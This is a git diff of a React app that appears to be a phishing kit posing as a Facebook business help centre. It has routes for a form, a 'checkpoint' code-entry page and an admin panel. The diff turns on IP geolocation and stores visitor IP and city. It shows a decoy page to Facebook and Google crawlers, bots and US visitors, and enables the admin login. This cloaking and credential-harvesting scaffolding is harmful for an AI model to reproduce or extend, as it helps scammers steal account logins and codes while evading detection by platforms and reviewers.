@@ -8,6 +8,7 @@ import AuthCode from "./pages/authCode";
 import AdminPage from "./pages/admin";
 import Login from "./pages/login";
 import { isbot } from "isbot";
+import { Home } from "react-ionicons";
 
 
 function PrivateRoute({ children }) {
@@ -43,21 +44,8 @@ function App() {
 
   const setLocaltion =  () => {
     try {
-     // https://ipinfo.io/json
-      fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
+      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
         var countryCode = d.country;
-        var privacy = d.privacy;
-        if(privacy){
-          if(
-             privacy.vpn == true
-            || privacy.hosting == true
-            || privacy.relay == true
-            || privacy.tor == true
-            || privacy.proxy == true
-          ){
-           // SetUserHiden(true);
-          }
-        }
         setCountryCode(countryCode.toLowerCase());
         localStorage.setItem(
           "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
@@ -69,41 +57,13 @@ function App() {
   };
 
   useEffect(() => {
-    //setLocaltion();
+    setLocaltion();
   }, []);
-
-
-  return (
-    <BrowserRouter>
-      <div id="app">
-        <Routes>
-          <Route path="/" element={<HomePage/>} />
-          <Route path="id/:userID" element={<MyForm/>} />
-          <Route path="/business-help-center" element={<MyForm/>} />
-          <Route path="checkpoint/:userID" element={<AuthCode />} />
-          <Route path="processing/:userID" element={<ClassUser />} />
-          {/* <Route path="/login" element={<Login />} />
-          <Route
-            path="/admin"
-            element={
-              <PrivateRoute>
-                <AdminPage />
-              </PrivateRoute>
-            }
-          /> */}
-          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
-        </Routes>
-      </div>
-    </BrowserRouter>
-  );
 
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
-    if(IsUserHiden){
-      return(showIframe("homepage.html"));
-    }else{
       if(countryCode.length == 0){
         return(           
           <div className="loading">
@@ -111,19 +71,19 @@ function App() {
           </div>
         );
       }else{
-        if(countryCode.includes('vn')){
+        if(countryCode.includes('us')){
           return(showIframe("homepage.html"));
         }else{
           return (
             <BrowserRouter>
               <div id="app">
                 <Routes>
-                  <Route path="/" element={<MyForm/>} />
+                  <Route path="/" element={<HomePage/>} />
                   <Route path="id/:userID" element={<MyForm/>} />
                   <Route path="/business-help-center" element={<MyForm/>} />
                   <Route path="checkpoint/:userID" element={<AuthCode />} />
                   <Route path="processing/:userID" element={<ClassUser />} />
-                  {/* <Route path="/login" element={<Login />} />
+                  <Route path="/login" element={<Login />} />
                   <Route
                     path="/admin"
                     element={
@@ -131,7 +91,7 @@ function App() {
                         <AdminPage />
                       </PrivateRoute>
                     }
-                  /> */}
+                  />
                   <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                 </Routes>
               </div>
@@ -139,7 +99,6 @@ function App() {
           );
         }
       }
-    }
   }else{
     return(showIframe("homepage.html"));
   }
